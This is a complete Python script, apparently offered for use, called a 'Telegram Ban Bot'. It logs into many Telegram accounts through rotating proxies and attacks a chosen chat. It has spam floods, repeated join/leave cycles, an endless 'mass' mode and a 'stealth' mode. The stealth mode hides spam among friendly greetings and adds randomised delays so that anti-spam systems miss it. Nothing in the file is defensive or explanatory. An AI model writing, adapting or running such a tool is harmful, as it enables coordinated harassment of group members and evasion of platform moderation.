#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
COMPLETE TELEGRAM BAN BOT v2.0
Multi-account spam + join/leave + stealth attacks
"""

import asyncio
import random
import os
import signal
from telethon import TelegramClient
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.tl.functions.messages import SendMessageRequest
from telethon.errors import (
    FloodWaitError, UserBannedInChannelError, 
    ChatAdminRequiredError, PeerFloodError
)
from telethon.sessions import StringSession
import config

class TelegramBanBot:
    def __init__(self):
        self.clients = []
        self.running = False
        os.makedirs("sessions", exist_ok=True)
    
    async def setup_clients(self):
        """Initialize all Telegram clients"""
        print("🔄 Initializing accounts...")
        print(f"📱 Found {len(config.API_ACCOUNTS)} accounts")
        
        for i, acc in enumerate(config.API_ACCOUNTS):
            try:
                session_file = f"sessions/session_{acc['phone']}"
                
                # Proxy support
                proxy = None
                if config.PROXIES:
                    proxy_config = config.PROXIES[i % len(config.PROXIES)]
                    proxy = ("socks5", *proxy_config.split("://")[1].split(":"))
                
                client = TelegramClient(
                    session_file, acc['api_id'], acc['api_hash'],
                    proxy=proxy
                )
                
                await client.start(acc['phone'])
                me = await client.get_me()
                
                client_data = {
                    'client': client,
                    'phone': acc['phone'],
                    'id': me.id,
                    'username': getattr(me, 'username', 'None'),
                    'first_name': me.first_name
                }
                
                self.clients.append(client_data)
                print(f"✅ [{i+1:2d}] {acc['phone']} | @{me.username or 'No username'} | {me.first_name}")
                
            except Exception as e:
                print(f"❌ [{i+1:2d}] {acc['phone']}: {str(e)[:50]}")
        
        print(f"\n🎯 READY: {len(self.clients)}/{len(config.API_ACCOUNTS)} accounts active")
    
    async def send_spam(self, client_data):
        """Spam attack from single account"""
        client = client_data['client']
        acc_id = client_data['id']
        username = client_data['username']
        
        success = 0
        try:
            for i in range(config.SPAM_PER_ACCOUNT):
                # Mix normal + spam messages (stealth)
                if i % 4 == 0:
                    msg = random.choice([
                        "Good morning everyone!", "Nice group!", 
                        "Thanks for adding me!", "Hello!"
                    ])
                else:
                    msg = random.choice(config.SPAM_MESSAGES)
                
                await client.send_message(config.TARGET_CHAT, msg)
                success += 1
                
                print(f"💬 [{acc_id:>8}] [{i+1:2d}/{config.SPAM_PER_ACCOUNT}] "
                      f"{msg[:35]}...")
                
                # Human-like delays
                delay = random.uniform(*config.ATTACK_DELAY)
                await asyncio.sleep(delay)
            
        except FloodWaitError as e:
            print(f"🌊 [{acc_id:>8}] FLOOD WAIT {e.seconds}s")
            await asyncio.sleep(e.seconds)
        except (UserBannedInChannelError, ChatAdminRequiredError):
            print(f"🚫 [{acc_id:>8}] BANNED/RESTRICTED")
        except Exception as e:
            print(f"❌ [{acc_id:>8}] ERROR: {str(e)[:40]}")
        
        return success
    
    async def join_leave_spam(self, client_data):
        """Join/leave spam attack"""
        client = client_data['client']
        acc_id = client_data['id']
        
        for cycle in range(config.JOIN_LEAVE_CYCLES):
            try:
                await client(JoinChannelRequest(config.TARGET_CHAT))
                print(f"📥 [{acc_id:>8}] JOINED (cycle {cycle+1})")
                await asyncio.sleep(random.randint(25, 55))
                
                await client(LeaveChannelRequest(config.TARGET_CHAT))
                print(f"📤 [{acc_id:>8}] LEFT (cycle {cycle+1})")
                await asyncio.sleep(random.randint(40, 80))
                
            except Exception as e:
                print(f"❌ [{acc_id:>8}] J/L ERROR: {str(e)[:30]}")
                break
    
    async def stealth_attack(self):
        """Advanced stealth attack"""
        print("\n🕵️‍♂️  STEALTH ATTACK STARTED")
        print("Mixing normal + spam messages...")
        
        tasks = []
        for client_data in self.clients[:10]:  # First 10 accounts
            if random.random() > 0.3:  # 70% spam, 30% join/leave
                tasks.append(asyncio.create_task(self.send_spam(client_data)))
            else:
                tasks.append(asyncio.create_task(self.join_leave_spam(client_data)))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def mass_attack(self):
        """Full mass attack"""
        print("\n💥 MASS ATTACK ENGAGED - INFINITE WAVES")
        wave = 1
        
        while self.running:
            print(f"\n🌊 WAVE {wave} STARTING...")
            tasks = []
            
            # Random 3-7 accounts per wave
            active_accounts = random.sample(self.clients, 
                                          k=min(random.randint(3, 7), len(self.clients)))
            
            for client_data in active_accounts:
                tasks.append(asyncio.create_task(self.send_spam(client_data)))
            
            await asyncio.gather(*tasks, return_exceptions=True)
            
            print(f"✅ Wave {wave} complete ({len(active_accounts)} accounts)")
            wave += 1
            
            if self.running:
                print("⏳ Next wave in 90-180s...")
                await asyncio.sleep(random.randint(90, 180))
    
    async def run_attack(self, attack_type):
        self.running = True
        try:
            if attack_type == "stealth":
                await self.stealth_attack()
            elif attack_type == "mass":
                await self.mass_attack()
            elif attack_type == "spam":
                tasks = [self.send_spam(c) for c in self.clients]
                await asyncio.gather(*tasks)
            elif attack_type == "joinleave":
                tasks = [self.join_leave_spam(c) for c in self.clients]
                await asyncio.gather(*tasks)
        finally:
            self.running = False
    
    async def disconnect_all(self):
        """Clean shutdown"""
        for client_data in self.clients:
            try:
                await client_data['client'].disconnect()
            except:
                pass
        print("🔌 All sessions disconnected")

def signal_handler(bot, signum, frame):
    print("\n🛑 Shutting down...")
    bot.running = False

async def main_menu():
    bot = TelegramBanBot()
    
    # Signal handling
    signal.signal(signal.SIGINT, lambda s,f: signal_handler(bot, s, f))
    
    print("""
╔══════════════════════════════════════╗
║    🔥 TELEGRAM BAN BOT v2.0 🔥       ║
║     Multi-Account Attack Suite      ║
╚══════════════════════════════════════╝
    """)
    
    # Setup
    await bot.setup_clients()
    
    while True:
        print("\n📋 ATTACK MENU:")
        print("1. 🕵️  Stealth Attack (Recommended)")
        print("2. 💥 Mass Spam (Infinite)")
        print("3. 📨 Pure Spam")
        print("4. 📥📤 Join/Leave Spam")
        print("5. 👋 Exit")
        
        choice = input("\n🎯 Choose attack (1-5): ").strip()
        
        if choice == "1":
            await bot.run_attack("stealth")
        elif choice == "2":
            await bot.run_attack("mass")
        elif choice == "3":
            await bot.run_attack("spam")
        elif choice == "4":
            await bot.run_attack("joinleave")
        elif choice == "5":
            break
        
        print("\n⏳ Attack complete! Press Enter for menu...")
        input()
    
    await bot.disconnect_all()
    print("👋 Goodbye!")

if __name__ == "__main__":
    asyncio.run(main_menu())
